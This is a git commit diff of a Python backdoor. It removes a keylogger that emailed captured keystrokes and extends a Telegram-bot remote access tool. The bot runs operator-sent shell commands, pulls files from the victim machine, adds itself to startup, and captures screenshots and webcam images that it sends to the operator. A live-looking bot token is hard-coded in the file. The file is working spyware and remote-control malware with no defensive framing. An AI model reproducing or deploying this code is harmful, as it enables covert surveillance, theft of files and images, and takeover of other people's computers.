1c49433830eef4f3313bb1fdfce65e97357de2e4
Gwin_disel <danya.savin.03@mail.ru>
2022-08-04 22:27:56 +0300

    adding getting screenshots_2

--- backDoor.py
+++ backDoor.py
@@ -1,73 +1,25 @@
-import os
+import getpass
+from logging import basicConfig, getLogger, INFO
 
-from pynput.keyboard import Listener
-import threading
-import smtplib
+from aiogram import Bot, types
+from aiogram.dispatcher import Dispatcher
+from aiogram.utils import executor
 
+USER_NAME = getpass.getuser()
 
-def send_mail(email, password, message):
-    server = smtplib.SMTP("smtp.gmail.com", 587)
-    server.starttls()
-    server.login(email, password)
-    server.sendmail(email, email, message)
-    server.quit()
+basicConfig(level=INFO)
+log = getLogger()
 
-
-class KeyLogger:
-    def __init__(self, time_save):
-        self.log = ''
-        self.time_save = time_save
-
-    def append_to_log(self, string):
-        self.log += string
-
-    def write_to_file(self):
-        with open("log.txt", "a") as f:
-            f.write(self.log + '\n')
-
-    def process_key_press(self, key):
-        try:
-            current_key = str(key.char)
-        except AttributeError:
-            if key == key.space:
-                current_key = ' '
-            else:
-                current_key = ' ' + str(key) + ' '
-
-        self.append_to_log(current_key)
-
-    def report(self):
-        self.write_to_file()
-        self.log = ''
-        timer = threading.Timer(self.time_save, self.report)
-        timer.start()
-
-    def start(self):
-        keyboard_listener = Listener(on_press=self.process_key_press)
-        with keyboard_listener as kl:
-            self.report()
-            kl.join()
+TOKEN = "5190279756:AAH2rA0hZdtIziHSKm3A3YtXIIPihN4GXQ0"
+bot = Bot(token=TOKEN)
+dp = Dispatcher(bot)
 
 
-# my_first_keylogger = KeyLogger(3600)
-# my_first_keylogger.start()
-#
+@dp.message_handler()
+async def echo_message(msg: types.Message):
+    print(2)
+    await bot.send_message(msg.from_user.id, msg.text)
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+if __name__ == '__main__':
+    executor.start_polling(dp)
--- main.py
+++ main.py
@@ -1,16 +1,21 @@
+import getpass
 import io
 import os
 import subprocess
-import getpass
-import pyautogui as pg
+import pyautogui
+import cv2
+import pyscreenshot
+from logging import basicConfig, getLogger, INFO
 
-from aiogram.types import ContentType
 from aiogram import Bot, types
 from aiogram.dispatcher import Dispatcher
+from aiogram.types import ContentType
 from aiogram.utils import executor
 
-
 USER_NAME = getpass.getuser()
+
+basicConfig(level=INFO)
+log = getLogger()
 
 
 def add_to_startup(file_path=""):
@@ -26,6 +31,7 @@ class RemoteManager:
         self.bot = bot
 
     def execute(self, command):
+        result = ""
         try:
             print(command)
             if command[0] == 'cd' and len(command) > 1:
@@ -48,7 +54,8 @@ class RemoteManager:
         res = ''
         while shell_output_string:
             shell_output_string = my_out.readline()
-            res += shell_output_string
+            new_string = ' '.join(shell_output_string.split()) + '\n'
+            res += new_string
 
         return res
 
@@ -103,7 +110,7 @@ rm = RemoteManager(bot)
 async def process_start_command(message: types.Message):
     await message.reply("Привет!\n"
                         "Вот список моих комманд:\n"
-                        "/download 'file_name' - скачать файл из текущей дериктории")
+                        "/download 'file_name' - скачать файл из текущей директории")
 
 
 async def send_message(bot, id, text):
@@ -116,7 +123,7 @@ async def send_message(bot, id, text):
 async def download(message: types.Message):
     try:
         command = message.text.split()
-        content = open(command[1], 'rb').read()
+        content = open(command[1], 'rb')
 
         await message.reply_document(content)
     except Exception:
@@ -131,18 +138,42 @@ async def exe(message: types.Message):
 
 @dp.message_handler(commands=['screen'])
 async def send_screenshot(msg: types.Message):
-    im1 = pg.screenshot()
-    im1.save(r"screenshot.png")
+    pyautogui.hotkey('win', 'd')
+    image = pyscreenshot.grab()
+    image.save("screen.png")
+
+    await bot.send_photo(msg.from_user.id, types.InputFile('screen.png'))
 
 
-    # await bot.send_photo(msg.from_user.id, photo=photo)
+@dp.message_handler(commands=['cam'])
+async def send_cam(msg: types.Message):
+    cap = cv2.VideoCapture(0)
+
+    # Check if the webcam is opened correctly
+    if not cap.isOpened():
+        res = "Error! No access to cam"
+
+    ret, frame = cap.read()
+    # уменьшить в 2 раза
+    frame = cv2.resize(frame, None, fx=0.5, fy=0.5, interpolation=cv2.INTER_AREA)
+    cv2.imwrite("screen_camera.png", frame)
+
+    cap.release()
+    cv2.destroyAllWindows()
+
+    await bot.send_photo(msg.from_user.id, types.InputFile('screen_camera.png'))
+
+
+@dp.message_handler(commands=['o'])
+async def echo_message(msg: types.Message):
+    pyautogui.hotkey('f1')
 
 
 @dp.message_handler()
 async def echo_message(msg: types.Message):
     command = str(msg.text).split()
     result = rm.execute(command)
-
+    print(1)
     await send_message(bot, msg.from_user.id, result)
 
 
